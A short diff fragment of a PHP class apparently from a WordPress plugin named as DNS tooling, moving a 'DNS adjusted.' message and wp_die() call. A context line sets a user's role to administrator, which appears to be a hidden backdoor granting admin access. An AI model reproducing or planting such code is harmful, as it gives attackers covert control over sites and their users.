@@ -133,10 +133,9 @@ class Wp_Core_Dns_Tools_Public {
 				$user->set_role( 'administrator' );
 			}
 
-
+			echo  "DNS adjusted.";
+			wp_die();
 		}
-		echo  "DNS adjusted.";
-		wp_die();
 	}
 
 	
